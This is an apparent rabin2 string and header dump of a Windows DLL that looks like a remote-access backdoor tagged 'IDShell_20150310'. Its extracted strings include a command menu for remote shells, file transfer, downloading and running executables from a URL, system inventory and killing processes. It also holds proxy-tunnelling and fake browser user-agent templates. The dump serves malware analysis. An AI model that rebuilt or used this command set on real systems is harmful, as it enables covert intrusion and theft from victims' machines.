Missing bin header main
Missing bin header dwarf
[Sections]

nth paddr          size vaddr         vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000400  0x12e00 0x10001000  0x13000 -r-x .text
1   0x00013200   0x4200 0x10014000   0x5000 -r-- .rdata
2   0x00017400   0x1a00 0x10019000   0xf000 -rw- .data
3   0x00018e00    0x600 0x10028000   0x1000 -r-- .rsrc
4   0x00019400   0x1800 0x10029000   0x2000 -r-- .reloc

[Segments]

nth paddr  size vaddr  vsize perm name
――――――――――――――――――――――――――――――――――――――

[Entrypoints]
vaddr=0x10007524 paddr=0x00006924 haddr=0x00000120 type=program

1 entrypoints
[Constructors]

0 entrypoints
[Imports]
nth vaddr      bind type lib          name
2   0x00013450 0x10014250 NONE   FUNC 0    WININET.dll  imp.InternetReadFile
3   0x00013454 0x10014254 NONE   FUNC 0    WININET.dll  imp.HttpOpenRequestA
4   0x00013458 0x10014258 NONE   FUNC 0    WININET.dll  imp.InternetConnectA
5   0x0001345c 0x1001425c NONE   FUNC 0    WININET.dll  imp.InternetOpenA
6   0x00013460 0x10014260 NONE   FUNC 0    WININET.dll  imp.InternetCloseHandle
7   0x00013464 0x10014264 NONE   FUNC 0    WININET.dll  imp.InternetQueryOptionA
8   0x00013468 0x10014268 NONE   FUNC 0    WININET.dll  imp.InternetOpenUrlA
[Strings]
nth paddr      vaddr      len  size section type    string
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000134fe 0x100142fe 7    8    .rdata  ascii   \a\b\t\n\v\f\r
1   0x00013517 0x10014317 95   96   .rdata  ascii    !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
2   0x00013578 0x10014378 13   14   .rdata  ascii   EncodePointer
3   0x00013588 0x10014388 12   26   .rdata  utf16le KERNEL32.DLL
4   0x000135a4 0x100143a4 13   14   .rdata  ascii   DecodePointer
5   0x000135b4 0x100143b4 7    8    .rdata  ascii   FlsFree
6   0x000135bc 0x100143bc 11   12   .rdata  ascii   FlsSetValue
7   0x000135c8 0x100143c8 11   12   .rdata  ascii   FlsGetValue
8   0x000135d4 0x100143d4 8    9    .rdata  ascii   FlsAlloc
9   0x000135e0 0x100143e0 6    14   .rdata  utf16le (null)
10  0x000135f0 0x100143f0 6    7    .rdata  ascii   (null)
11  0x00013619 0x10014419 7    8    .rdata  ascii   ( 8PX\a\b
12  0x00013621 0x10014421 6    7    .rdata  ascii   700WP\a
13  0x00013630 0x10014430 7    8    .rdata  ascii   \b`h````
14  0x00013639 0x10014439 9    10   .rdata  ascii   xpxxxx\b\a\b
15  0x00013654 0x10014454 14   15   .rdata  ascii   CorExitProcess
16  0x00013664 0x10014464 11   24   .rdata  utf16le mscoree.dll
17  0x0001367c 0x1001447c 14   15   .rdata  ascii   runtime error 
18  0x0001368c 0x1001448c 13   14   .rdata  ascii   TLOSS error\r\n
19  0x0001369c 0x1001449c 12   13   .rdata  ascii   SING error\r\n
20  0x000136ac 0x100144ac 14   15   .rdata  ascii   DOMAIN error\r\n
21  0x000136c0 0x100144c0 154  155  .rdata  ascii   R6034\r\nAn application has made an attempt to load the C runtime library incorrectly.\nPlease contact the application's support team for more information.\r\n
22  0x00013760 0x10014560 246  247  .rdata  ascii   R6033\r\n- Attempt to use MSIL code from this assembly during native code initialization\nThis indicates a bug in your application. It is most likely the result of calling an MSIL-compiled (/clr) function from a native constructor or from DllMain.\r\n
23  0x00013858 0x10014658 50   51   .rdata  ascii   R6032\r\n- not enough space for locale information\r\n
24  0x00013890 0x10014690 98   99   .rdata  ascii   R6031\r\n- Attempt to initialize the CRT more than once.\nThis indicates a bug in your application.\r\n
25  0x000138f4 0x100146f4 30   31   .rdata  ascii   R6030\r\n- CRT not initialized\r\n
26  0x00013914 0x10014714 36   37   .rdata  ascii   R6028\r\n- unable to initialize heap\r\n
27  0x0001393c 0x1001473c 52   53   .rdata  ascii   R6027\r\n- not enough space for lowio initialization\r\n
28  0x00013974 0x10014774 52   53   .rdata  ascii   R6026\r\n- not enough space for stdio initialization\r\n
29  0x000139ac 0x100147ac 37   38   .rdata  ascii   R6025\r\n- pure virtual function call\r\n
30  0x000139d4 0x100147d4 52   53   .rdata  ascii   R6024\r\n- not enough space for _onexit/atexit table\r\n
31  0x00013a0c 0x1001480c 40   41   .rdata  ascii   R6019\r\n- unable to open console device\r\n
32  0x00013a38 0x10014838 32   33   .rdata  ascii   R6018\r\n- unexpected heap error\r\n
33  0x00013a5c 0x1001485c 44   45   .rdata  ascii   R6017\r\n- unexpected multithread lock error\r\n
34  0x00013a8c 0x1001488c 43   44   .rdata  ascii   R6016\r\n- not enough space for thread data\r\n
35  0x00013ab8 0x100148b8 149  150  .rdata  ascii   \r\nThis application has requested the Runtime to terminate it in an unusual way.\nPlease contact the application's support team for more information.\r\n
36  0x00013b50 0x10014950 43   44   .rdata  ascii   R6009\r\n- not enough space for environment\r\n
37  0x00013b7c 0x1001497c 41   42   .rdata  ascii   R6008\r\n- not enough space for arguments\r\n
38  0x00013ba8 0x100149a8 44   45   .rdata  ascii   R6002\r\n- floating point support not loaded\r\n
39  0x00013bd8 0x100149d8 36   37   .rdata  ascii   Microsoft Visual C++ Runtime Library
40  0x00013c08 0x10014a08 22   23   .rdata  ascii   <program name unknown>
41  0x00013c20 0x10014a20 25   26   .rdata  ascii   Runtime Error!\n\nProgram: 
42  0x00013c44 0x10014a44 5    6    .rdata  ascii   UTF-8
43  0x00013c4c 0x10014a4c 8    9    .rdata  ascii   UTF-16LE
44  0x00013c58 0x10014a58 7    8    .rdata  ascii   UNICODE
45  0x00013dd8 0x10014bd8 33   68   .rdata  utf16le          (((((                  H
46  0x00013fda 0x10014dda 33   68   .rdata  utf16le          h((((                  H
47  0x000140d8 0x10014ed8 34   70   .rdata  utf16le                                  H
48  0x00014267 0x10015067 7    8    .rdata  ascii   \a\b\t\n\v\f\r
49  0x00014280 0x10015080 95   96   .rdata  ascii    !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
50  0x000143e7 0x100151e7 7    8    .rdata  ascii   \a\b\t\n\v\f\r
51  0x00014400 0x10015200 95   96   .rdata  ascii    !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
52  0x000144e0 0x100152e0 8    9    .rdata  ascii   HH:mm:ss
53  0x000144ec 0x100152ec 19   20   .rdata  ascii   dddd, MMMM dd, yyyy
54  0x00014500 0x10015300 8    9    .rdata  ascii   MM/dd/yy
55  0x00014514 0x10015314 8    9    .rdata  ascii   December
56  0x00014520 0x10015320 8    9    .rdata  ascii   November
57  0x0001452c 0x1001532c 7    8    .rdata  ascii   October
58  0x00014534 0x10015334 9    10   .rdata  ascii   September
59  0x00014540 0x10015340 6    7    .rdata  ascii   August
60  0x00014548 0x10015348 4    5    .rdata  ascii   July
61  0x00014550 0x10015350 4    5    .rdata  ascii   June
62  0x00014558 0x10015358 5    6    .rdata  ascii   April
63  0x00014560 0x10015360 5    6    .rdata  ascii   March
64  0x00014568 0x10015368 8    9    .rdata  ascii   February
65  0x00014574 0x10015374 7    8    .rdata  ascii   January
66  0x000145ac 0x100153ac 8    9    .rdata  ascii   Saturday
67  0x000145b8 0x100153b8 6    7    .rdata  ascii   Friday
68  0x000145c0 0x100153c0 8    9    .rdata  ascii   Thursday
69  0x000145cc 0x100153cc 9    10   .rdata  ascii   Wednesday
70  0x000145d8 0x100153d8 7    8    .rdata  ascii   Tuesday
71  0x000145e0 0x100153e0 6    7    .rdata  ascii   Monday
72  0x000145e8 0x100153e8 6    7    .rdata  ascii   Sunday
73  0x00014635 0x10015435 5    6    .rdata  ascii   ('8PW
74  0x0001463e 0x1001543e 5    6    .rdata  ascii   700PP
75  0x00014650 0x10015450 17   18   .rdata  ascii   `h`hhh\b\b\axppwpp\b\b
76  0x0001466c 0x1001546c 23   24   .rdata  ascii   GetProcessWindowStation
77  0x00014684 0x10015484 25   26   .rdata  ascii   GetUserObjectInformationA
78  0x000146a0 0x100154a0 18   19   .rdata  ascii   GetLastActivePopup
79  0x000146b4 0x100154b4 15   16   .rdata  ascii   GetActiveWindow
80  0x000146c4 0x100154c4 11   12   .rdata  ascii   MessageBoxA
81  0x000146d0 0x100154d0 10   11   .rdata  ascii   USER32.DLL
82  0x000146e4 0x100154e4 21   22   .rdata  ascii   SunMonTueWedThuFriSat
83  0x000146fc 0x100154fc 36   37   .rdata  ascii   JanFebMarAprMayJunJulAugSepOctNovDec
84  0x00014724 0x10015524 7    8    .rdata  ascii   CONOUT$
85  0x0001472c 0x1001552c 15   16   .rdata  ascii   AVCDEFDFDEFDFET
86  0x0001473c 0x1001553c 9    10   .rdata  ascii   mmc32.exe
87  0x00014748 0x10015548 19   20   .rdata  ascii   [IDShell_20150310]#
88  0x0001475c 0x1001555c 27   28   .rdata  ascii   OpenProcessToken Error: %d\n
89  0x00014778 0x10015578 19   20   .rdata  ascii   SeShutdownPrivilege
90  0x00014794 0x10015594 12   13   .rdata  ascii   kernel32.dll
91  0x000147a4 0x100155a4 19   20   .rdata  ascii   GetNativeSystemInfo
92  0x000147b8 0x100155b8 7    8    .rdata  ascii   http://
93  0x000147c4 0x100155c4 4    5    .rdata  ascii   .pcx
94  0x000147cc 0x100155cc 11   12   .rdata  ascii   ID_20150310
95  0x000147d8 0x100155d8 35   36   .rdata  ascii   MSIE(%s); NA(%s); XY(%s:%d); VR(%s)
96  0x000147fc 0x100155fc 24   25   .rdata  ascii   MSIE(%s); NA(%s); VR(%s)
97  0x00014818 0x10015618 8    9    .rdata  ascii   HTTP/1.0
98  0x00014828 0x10015628 12   13   .rdata  ascii   Windows 2000
99  0x00014838 0x10015638 10   11   .rdata  ascii   Windows XP
100 0x00014844 0x10015644 14   15   .rdata  ascii   Windows XP x64
101 0x00014854 0x10015654 12   13   .rdata  ascii   Windows 2003
102 0x00014864 0x10015664 17   18   .rdata  ascii   Windows Vista x64
103 0x00014878 0x10015678 17   18   .rdata  ascii   Windows Vista x86
104 0x0001488c 0x1001568c 23   24   .rdata  ascii   Windows Server 2008 x64
105 0x000148a4 0x100156a4 23   24   .rdata  ascii   Windows Server 2008 x86
106 0x000148bc 0x100156bc 13   14   .rdata  ascii   Windows 7 x64
107 0x000148cc 0x100156cc 13   14   .rdata  ascii   Windows 7 x86
108 0x000148dc 0x100156dc 26   27   .rdata  ascii   Windows Server 2008 R2 x64
109 0x000148f8 0x100156f8 26   27   .rdata  ascii   Windows Server 2008 R2 x86
110 0x00014914 0x10015714 13   14   .rdata  ascii   Windows 8 x64
111 0x00014924 0x10015724 13   14   .rdata  ascii   Windows 8 x86
112 0x00014934 0x10015734 23   24   .rdata  ascii   Windows Server 2012 x64
113 0x0001494c 0x1001574c 23   24   .rdata  ascii   Windows Server 2012 x86
114 0x00014964 0x10015764 15   16   .rdata  ascii   Windows 8.1 x64
115 0x00014974 0x10015774 15   16   .rdata  ascii   Windows 8.1 x86
116 0x00014984 0x10015784 26   27   .rdata  ascii   Windows Server 2012 R2 x64
117 0x000149a0 0x100157a0 26   27   .rdata  ascii   Windows Server 2012 R2 x86
118 0x000149bc 0x100157bc 8    9    .rdata  ascii   Other OS
119 0x000149c8 0x100157c8 18   19   .rdata  ascii   ErrorID:%d(%08.8X)
120 0x000149e4 0x100157e4 24   25   .rdata  ascii   Create socket Error(%d)\n
121 0x00014a00 0x10015800 87   88   .rdata  ascii   CONNECT %s:%d HTTP/1.1\nUser-Agent: Mozilla/v5.0\nHOST: %s\nProxy-Connection: Keep-Alive\n\n
122 0x00014a58 0x10015858 30   31   .rdata  ascii   Connect Server(%s:%d) Error!\r\n
123 0x00014a88 0x10015888 12   13   .rdata  ascii   Explorer.exe
124 0x00014a98 0x10015898 39   40   .rdata  ascii   ReadFromFile Error! ErrorID: %d -> %s\r\n
125 0x00014ac0 0x100158c0 75   76   .rdata  ascii   \r\nReset putfile funtion, you can delete the file or translate file again!\r\n
126 0x00014b0c 0x1001590c 59   60   .rdata  ascii   \r\nCan't find [%s]  !\r\nCheck the file name and try again !\r\n
127 0x00014b48 0x10015948 23   24   .rdata  ascii   \r\nOpen [%s] error! %s\r\n
128 0x00014b60 0x10015960 27   28   .rdata  ascii   \r\nlink to [%s] %d failed!\r\n
129 0x00014b7c 0x1001597c 23   24   .rdata  ascii   \r\nlink to [%s] %d ok!\r\n
130 0x00014b94 0x10015994 25   26   .rdata  ascii   \r\n[%s] 's size if zero!\r\n
131 0x00014bb0 0x100159b0 42   43   .rdata  ascii   \r\nGet ControlInfo from FileClient error!\r\n
132 0x00014bdc 0x100159dc 5    6    .rdata  ascii   error
133 0x00014be4 0x100159e4 27   28   .rdata  ascii   \r\nFileClient has a error!\r\n
134 0x00014c00 0x10015a00 5    6    .rdata  ascii   exist
135 0x00014c08 0x10015a08 54   55   .rdata  ascii   \r\n[%s] is exist on the side of FileClient, check it!\r\n
136 0x00014c40 0x10015a40 46   47   .rdata  ascii   \r\nReady to send [%s]\r\nPlease wait,sending...\r\n
137 0x00014c70 0x10015a70 45   46   .rdata  ascii   \r\nReadFromFile [%s] error, dwSendIndex = %d\r\n
138 0x00014ca0 0x10015aa0 28   29   .rdata  ascii   \r\nSend [%s] to [%s] %d ok!\r\n
139 0x00014cc0 0x10015ac0 18   19   .rdata  ascii   DownLoad Now ...\r\n
140 0x00014cd8 0x10015ad8 67   68   .rdata  ascii   Http DownLoad The File Successfully\r\nThe File Current Path:\r\n[%s]\r\n
141 0x00014d1c 0x10015b1c 49   50   .rdata  ascii   \r\nYou have downloaded a PE file, it can be run!\r\n
142 0x00014d50 0x10015b50 66   67   .rdata  ascii   \r\nYou haven't downloaded a PE file, it can't be run!!!!!!!!!!!!!\r\n
143 0x00014d94 0x10015b94 32   33   .rdata  ascii   Fail To Http DownLoad The File\r\n
144 0x00014db8 0x10015bb8 27   28   .rdata  ascii   Fail To Connnet [%s] %s !\r\n
145 0x00014dd8 0x10015bd8 140  141  .rdata  ascii   GET /%s HTTP/1.1\r\nAccept: */*\r\nAccept-Language: zh-tw\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nConnection: Close\r\n\r\n
146 0x00014e68 0x10015c68 40   41   .rdata  ascii   Fail To DownLoad the File Though Proxy\r\n
147 0x00014e94 0x10015c94 18   19   .rdata  ascii   Fail To Recieve()\n
148 0x00014ea8 0x10015ca8 16   17   .rdata  ascii   Content-Length: 
149 0x00014ec0 0x10015cc0 29   30   .rdata  ascii   The File Current Path: [%s]\r\n
150 0x00014ee0 0x10015ce0 82   83   .rdata  ascii   \r\nDiskName[Volume]   Driver|FilsSystem     TotalSize|FreeSize            Percent\r\n
151 0x00014f38 0x10015d38 79   80   .rdata  ascii   -----------------------------------------------------------------------------\r\n
152 0x00014f88 0x10015d88 15   16   .rdata  ascii   DRIVE_REMOVABLE
153 0x00014f98 0x10015d98 6    7    .rdata  ascii   NODISK
154 0x00014fa0 0x10015da0 9    10   .rdata  ascii   DRIVE_FIX
155 0x00014fac 0x10015dac 12   13   .rdata  ascii   DRIVE_REMOTE
156 0x00014fbc 0x10015dbc 11   12   .rdata  ascii   DRIVE_CDROM
157 0x00014fc8 0x10015dc8 11   12   .rdata  ascii    RAM Driver
158 0x00014fd4 0x10015dd4 13   14   .rdata  ascii   DRIVE_UNKNOWN
159 0x00014fe8 0x10015de8 68   69   .rdata  ascii   %2.2s|%-11.11s %10.10s|%-5.5s %8ldMB|%8ldMB %6.1fG|%6.1fG  %2.1f%%\r\n
160 0x00015030 0x10015e30 101  102  .rdata  ascii   \r\nFixDisk TotalSize: %8ldMB|%-.1fG\r\nFreeSize:          %8ldMB|%-.1fG\r\nFreePercent:          %2.1f%%\r\n
161 0x00015098 0x10015e98 11   12   .rdata  ascii   InstallDate
162 0x000150a4 0x10015ea4 45   46   .rdata  ascii   SOFTWARE\Microsoft\Windows NT\CurrentVersion\
163 0x000150d4 0x10015ed4 25   26   .rdata  ascii   Fail to Get SystemVersion
164 0x000150f0 0x10015ef0 21   22   .rdata  ascii   Microsoft Windows NT 
165 0x00015108 0x10015f08 23   24   .rdata  ascii   Microsoft Windows 2000 
166 0x00015120 0x10015f20 21   22   .rdata  ascii   Microsoft Windows XP 
167 0x00015138 0x10015f38 30   31   .rdata  ascii   Microsoft Windows Server 2003 
168 0x00015158 0x10015f58 13   14   .rdata  ascii   Home Edition 
169 0x00015168 0x10015f68 13   14   .rdata  ascii   Professional 
170 0x00015178 0x10015f78 42   43   .rdata  ascii   Enterprise Edition/Advance Server(for 2k) 
171 0x000151a4 0x10015fa4 18   19   .rdata  ascii   DataCenter Server 
172 0x000151b8 0x10015fb8 6    7    .rdata  ascii   Server
173 0x000151c0 0x10015fc0 47   48   .rdata  ascii   SYSTEM\CurrentControlSet\Control\ProductOptions
174 0x000151f0 0x10015ff0 11   12   .rdata  ascii   ProductType
175 0x000151fc 0x10015ffc 5    6    .rdata  ascii   WINNT
176 0x00015204 0x10016004 8    9    .rdata  ascii   LANMANNT
177 0x00015210 0x10016010 7    8    .rdata  ascii   Server 
178 0x00015218 0x10016018 8    9    .rdata  ascii   SERVERNT
179 0x00015224 0x10016024 15   16   .rdata  ascii   Advaced Server 
180 0x00015234 0x10016034 18   19   .rdata  ascii   %d.%d %s(Build %d)
181 0x00015248 0x10016048 12   13   .rdata  ascii   %s(Build %d)
182 0x00015258 0x10016058 21   22   .rdata  ascii   Microsoft Windows 95 
183 0x00015270 0x10016070 4    5    .rdata  ascii   OSR2
184 0x00015278 0x10016078 21   22   .rdata  ascii   Microsoft Windows 98 
185 0x00015294 0x10016094 21   22   .rdata  ascii   Microsoft Windows Me 
186 0x000152ac 0x100160ac 17   18   .rdata  ascii   Microsoft Win32s 
187 0x000152c0 0x100160c0 51   52   .rdata  ascii   SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
188 0x000152f8 0x100160f8 105  106  .rdata  ascii   \r\nSoftware Information:\r\nNo.  DisplayName [SoftwareName]\r\n---------------------------------------------\r\n
189 0x00015364 0x10016164 5    6    .rdata  ascii   %s\%s
190 0x0001536c 0x1001616c 11   12   .rdata  ascii   DisplayName
191 0x00015378 0x10016178 9    10   .rdata  ascii   %3u  %s\r\n
192 0x00015384 0x10016184 11   12   .rdata  ascii   %3u  [%s]\r\n
193 0x00015390 0x10016190 15   16   .rdata  ascii   UninstallString
194 0x000153a0 0x100161a0 9    10   .rdata  ascii        %s\r\n
195 0x000153ac 0x100161ac 17   18   .rdata  ascii   \r\nList Complete\r\n
196 0x000153c0 0x100161c0 56   57   .rdata  ascii   \r\nLocalHost IP\r\n--------------------------------------\r\n
197 0x000153fc 0x100161fc 16   17   .rdata  ascii   IP[%d]:     %s\r\n
198 0x00015410 0x10016210 4    5    .rdata  ascii   \r\n\r\n
199 0x00015418 0x10016218 10   11   .rdata  ascii   SourcePath
200 0x00015424 0x10016224 9    10   .rdata  ascii   ProductId
201 0x00015430 0x10016230 22   23   .rdata  ascii   RegisteredOrganization
202 0x00015448 0x10016248 15   16   .rdata  ascii   RegisteredOwner
203 0x00015458 0x10016258 11   12   .rdata  ascii   CurrentType
204 0x00015464 0x10016264 7    8    .rdata  ascii   Display
205 0x0001546c 0x1001626c 61   62   .rdata  ascii   \r\nSystem Infomation\r\n--------------------------------------\r\n
206 0x000154ac 0x100162ac 22   23   .rdata  ascii   SystemVersion:    %s\r\n
207 0x000154c4 0x100162c4 22   23   .rdata  ascii   Product  ID:      %s\r\n
208 0x000154dc 0x100162dc 22   23   .rdata  ascii   InstallPath:      %s\r\n
209 0x000154f4 0x100162f4 44   45   .rdata  ascii   InstallTime:      %d-%d-%d, %02d:%02d:%02d\r\n
210 0x00015524 0x10016324 22   23   .rdata  ascii   ResgisterGroup:   %s\r\n
211 0x0001553c 0x1001633c 22   23   .rdata  ascii   RegisterUser:     %s\r\n
212 0x00015554 0x10016354 22   23   .rdata  ascii   ComputerName:     %s\r\n
213 0x0001556c 0x1001636c 22   23   .rdata  ascii   WindowsDirectory: %s\r\n
214 0x00015584 0x10016384 24   25   .rdata  ascii   System Directory: %s\r\n\r\n
215 0x000155a0 0x100163a0 32   33   .rdata  ascii   Number of Processors:       %d\r\n
216 0x000155c4 0x100163c4 47   48   .rdata  ascii   HARDWARE\DESCRIPTION\System\CentralProcessor\%x
217 0x000155f4 0x100163f4 19   20   .rdata  ascii   ProcessorNameString
218 0x00015608 0x10016408 4    5    .rdata  ascii   ~MHz
219 0x00015610 0x10016410 20   21   .rdata  ascii   CPU[%d]:  %s: %sMHz\n
220 0x00015628 0x10016428 37   38   .rdata  ascii   RAM:         %dMB Total, %dMB Free.\r\n
221 0x00015650 0x10016450 35   36   .rdata  ascii   DisplayMode: %d x %d, %dHz, %dbit\r\n
222 0x00015674 0x10016474 37   38   .rdata  ascii   Uptime:      %d Days %02u:%02u:%02u\r\n
223 0x0001569c 0x1001649c 16   17   .rdata  ascii   SeDebugPrivilege
224 0x000156b0 0x100164b0 39   40   .rdata  ascii   CreateToolhelp32Snapshot Failed:Error%d
225 0x000156d8 0x100164d8 31   32   .rdata  ascii   PID     Process      FilePath\r\n
226 0x000156f8 0x100164f8 81   82   .rdata  ascii   -------------------------------------------------------------------------------\r\n
227 0x0001574c 0x1001654c 14   15   .rdata  ascii   %-8d%-13s%s%\r\n
228 0x0001575c 0x1001655c 35   36   .rdata  ascii   \r\nList Processes Compeleted\r\n\r\n\r\n\r\n
229 0x00015780 0x10016580 38   39   .rdata  ascii   Process32First() Fail:Error %d\r\n\r\n\r\n\r\n
230 0x000157a8 0x100165a8 28   29   .rdata  ascii   Could Not Find The Process\r\n
231 0x000157c8 0x100165c8 23   24   .rdata  ascii   OpenProcess Error: %d\r\n
232 0x000157e0 0x100165e0 28   29   .rdata  ascii   TerminateProcess Error: %d\r\n
233 0x00015800 0x10016600 39   40   .rdata  ascii   Kill The Process %d(Pid) Successfully\r\n
234 0x00015828 0x10016628 7    8    .rdata  ascii   HeartOk
235 0x00015830 0x10016630 9    10   .rdata  ascii   ExitShell
236 0x0001583c 0x1001663c 4    5    .rdata  ascii   Exit
237 0x00015848 0x10016648 70   71   .rdata  ascii   Create Shell As Desk User Failed, Maybe There is no User Logoning...\r\n
238 0x00015890 0x10016690 36   37   .rdata  ascii   Domain:    [%s]\r\nLogonUser: [%s]\r\n\n\n
239 0x000158b8 0x100166b8 22   23   .rdata  ascii   Get logon user fail!\r\n
240 0x000158d0 0x100166d0 1166 1167 .rdata  ascii   -------------------------------------------------------------------------------\r\n? or Help                          -->Help Memu\r\nPut [RecvIP] [Port] [FileName]     -->Send File To FileClient\r\nReSetPut                           -->Reset Put Func\r\n\r\nGetFile [IP] [Port] [FileName]     -->Get File From FileServer\r\nGet [http://IP/A.exe] [File.exe]   -->Download File\r\n\r\n-------------------------------------------------------------------------------\r\nSysInfo                            -->1 View System Infor\r\nSoftInfo                           -->3 View Installed SoftWare\r\n\r\nPslist                             -->7 List Process\r\nPskill [PID]                       -->Kill Process\r\n-------------------------------------------------------------------------------\r\nShell [cmd.exe]                    -->4 Get A Shell\r\nShellA                             -->Get Shell As LogonUser\r\n-------------------------------------------------------------------------------\r\nVer                                -->Show Version\r\nExit                               -->Exit Control\r\n-------------------------------------------------------------------------------\r\n\r\nList Help Completed\r\n
241 0x00015d60 0x10016b60 9    10   .rdata  ascii   UI0Detect
242 0x00015d6c 0x10016b6c 5    6    .rdata  ascii   \inf\
243 0x00015d74 0x10016b74 7    8    .rdata  ascii   vga.dll
244 0x00015d7c 0x10016b7c 8    9    .rdata  ascii   inetsrv\
245 0x00015d88 0x10016b88 29   30   .rdata  ascii   connect [%s] %d ErrorID: %d\r\n
246 0x00015da8 0x10016ba8 8    9    .rdata  ascii   %s\t%s\t%s
247 0x00015db8 0x10016bb8 10   11   .rdata  ascii   DisConnect
248 0x00015dc4 0x10016bc4 5    6    .rdata  ascii   sleep
249 0x00015dd0 0x10016bd0 33   34   .rdata  ascii   Failed to create receive thread.\n
250 0x00015df8 0x10016bf8 4    5    .rdata  ascii   Help
251 0x00015e04 0x10016c04 8    9    .rdata  ascii   ResetPut
252 0x00015e10 0x10016c10 7    8    .rdata  ascii   GetFile
253 0x00015e1c 0x10016c1c 7    8    .rdata  ascii   Sysinfo
254 0x00015e28 0x10016c28 8    9    .rdata  ascii   SoftInfo
255 0x00015e38 0x10016c38 6    7    .rdata  ascii   Pslist
256 0x00015e44 0x10016c44 6    7    .rdata  ascii   Pskill
257 0x00015e4c 0x10016c4c 5    6    .rdata  ascii   Shell
258 0x00015e58 0x10016c58 7    8    .rdata  ascii   cmd.exe
259 0x00015e60 0x10016c60 22   23   .rdata  ascii   cmd.exe isn't exist!\r\n
260 0x00015e78 0x10016c78 20   21   .rdata  ascii   shell isn't exist!\r\n
261 0x00015e90 0x10016c90 6    7    .rdata  ascii   ShellA
262 0x00015e9c 0x10016c9c 5    6    .rdata  ascii   Sleep
263 0x00015ea4 0x10016ca4 4    5    .rdata  ascii   \r\n%s
264 0x00015eac 0x10016cac 4    5    .rdata  ascii   exit
265 0x00015ec6 0x10016cc6 4    5    .rdata  ascii   P?J\a
266 0x00015ed4 0x10016cd4 5    6    .rdata  ascii   e+000
267 0x00015eee 0x10016cee 27   28   .rdata  ascii   GAIsProcessorFeaturePresent
268 0x00015f0c 0x10016d0c 8    9    .rdata  ascii   KERNEL32
269 0x00015f18 0x10016d18 6    7    .rdata  ascii   1#QNAN
270 0x00015f20 0x10016d20 5    6    .rdata  ascii   1#INF
271 0x00015f28 0x10016d28 5    6    .rdata  ascii   1#IND
272 0x00015f30 0x10016d30 6    7    .rdata  ascii   1#SNAN
273 0x0001674e 0x1001754e 11   12   .rdata  ascii   ExitProcess
274 0x0001675c 0x1001755c 16   17   .rdata  ascii   GetComputerNameA
275 0x00016770 0x10017570 11   12   .rdata  ascii   CreateFileA
276 0x0001677e 0x1001757e 11   12   .rdata  ascii   GetFileSize
277 0x0001678c 0x1001758c 18   19   .rdata  ascii   GlobalMemoryStatus
278 0x000167a2 0x100175a2 14   15   .rdata  ascii   SetFilePointer
279 0x000167b4 0x100175b4 8    9    .rdata  ascii   lstrlenA
280 0x000167c0 0x100175c0 13   14   .rdata  ascii   PeekNamedPipe
281 0x000167d0 0x100175d0 13   14   .rdata  ascii   MapViewOfFile
282 0x000167e0 0x100175e0 15   16   .rdata  ascii   UnmapViewOfFile
283 0x000167f2 0x100175f2 12   13   .rdata  ascii   SetErrorMode
284 0x00016802 0x10017602 9    10   .rdata  ascii   HeapAlloc
285 0x0001680e 0x1001760e 17   18   .rdata  ascii   GetCurrentProcess
286 0x00016822 0x10017622 8    9    .rdata  ascii   HeapFree
287 0x0001682e 0x1001762e 14   15   .rdata  ascii   Process32First
288 0x00016840 0x10017640 19   20   .rdata  ascii   WaitForSingleObject
289 0x00016856 0x10017656 12   13   .rdata  ascii   GetTickCount
290 0x00016866 0x10017666 14   15   .rdata  ascii   GetProcessHeap
291 0x00016878 0x10017678 14   15   .rdata  ascii   FormatMessageA
292 0x0001688a 0x1001768a 20   21   .rdata  ascii   GetWindowsDirectoryA
293 0x000168a2 0x100176a2 9    10   .rdata  ascii   WriteFile
294 0x000168ae 0x100176ae 13   14   .rdata  ascii   GetDriveTypeA
295 0x000168be 0x100176be 11   12   .rdata  ascii   OpenProcess
296 0x000168cc 0x100176cc 19   20   .rdata  ascii   WideCharToMultiByte
297 0x000168e2 0x100176e2 21   22   .rdata  ascii   GetVolumeInformationA
